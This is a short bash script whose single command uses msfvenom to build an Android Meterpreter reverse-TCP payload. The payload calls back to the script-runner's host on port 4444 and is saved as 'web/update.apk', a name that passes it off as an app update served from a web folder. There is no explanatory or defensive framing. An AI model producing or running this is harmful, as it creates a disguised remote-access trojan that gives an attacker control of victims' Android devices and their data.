#!/bin/bash  
msfvenom -p android/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=4444 -o web/update.apk  
